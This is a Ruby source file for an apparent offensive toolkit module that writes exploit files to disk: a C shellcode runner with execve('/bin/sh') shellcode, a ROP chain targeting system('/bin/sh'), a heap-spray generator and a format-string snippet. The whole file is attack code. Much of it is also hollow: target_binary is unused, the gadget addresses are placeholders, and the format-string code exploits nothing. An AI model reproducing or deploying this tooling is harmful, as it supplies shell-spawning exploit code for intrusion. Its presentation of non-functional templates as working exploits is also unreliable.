require_relative '../utils/colorize'

class MemoryAttacks
  def self.generate_buffer_overflow_exploit(target_binary, offset = 100)
    exploit = <<~C
      #include <stdio.h>
      #include <string.h>
      #include <stdlib.h>
      
      char shellcode[] = 
          "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
          "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";
      
      int main(int argc, char *argv[]) {
          char buffer[#{offset + 100}];
          void (*func)();
          
          memset(buffer, 0x90, #{offset});
          memcpy(buffer + #{offset}, shellcode, strlen(shellcode));
          
          func = (void (*)()) buffer;
          func();
          
          return 0;
      }
    C
    
    filename = "buffer_overflow_#{Time.now.to_i}.c"
    File.write(filename, exploit)
    puts Colorize.green("Buffer overflow exploit saved: #{filename}")
    filename
  end

  def self.generate_rop_chain(target_binary)
    rop = <<~PYTHON
      #!/usr/bin/env python3
      
      import struct
      
      def p64(addr):
          return struct.pack('<Q', addr)
      
      def p32(addr):
          return struct.pack('<I', addr)
      
      pop_rdi = 0x0000000000401234
      pop_rsi = 0x0000000000401235
      pop_rdx = 0x0000000000401236
      system_addr = 0x0000000000401000
      binsh_addr = 0x0000000000402000
      
      rop_chain = b''
      rop_chain += p64(pop_rdi)
      rop_chain += p64(binsh_addr)
      rop_chain += p64(system_addr)
      
      print("ROP chain generated")
      print("Length: {} bytes".format(len(rop_chain)))
    PYTHON
    
    filename = "rop_chain_#{Time.now.to_i}.py"
    File.write(filename, rop)
    File.chmod(filename, 0755)
    puts Colorize.green("ROP chain generator saved: #{filename}")
    filename
  end

  def self.generate_heap_spray(heap_size = 0x1000000)
    spray = <<~PYTHON
      #!/usr/bin/env python3
      
      import struct
      
      def p64(addr):
          return struct.pack('<Q', addr)
      
      shellcode = b'\\x90' * 100 + b'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'
      
      heap_size = #{heap_size}
      spray = shellcode * (heap_size // len(shellcode))
      
      print("Heap spray generated: {} bytes".format(len(spray)))
      print("Shellcode address: 0x{:x}".format(0x0c0c0c0c))
    PYTHON
    
    filename = "heap_spray_#{Time.now.to_i}.py"
    File.write(filename, spray)
    File.chmod(filename, 0755)
    puts Colorize.green("Heap spray generator saved: #{filename}")
    filename
  end

  def self.generate_format_string_exploit(target_binary)
    exploit = <<~C
      #include <stdio.h>
      #include <stdlib.h>
      
      int main() {
          char format[100];
          unsigned int addr = 0x08049580;
          
          sprintf(format, "%%%dx%%n", 0x41414141);
          
          printf("%s\\n", format);
          
          return 0;
      }
    C
    
    filename = "format_string_#{Time.now.to_i}.c"
    File.write(filename, exploit)
    puts Colorize.green("Format string exploit saved: #{filename}")
    filename
  end
end

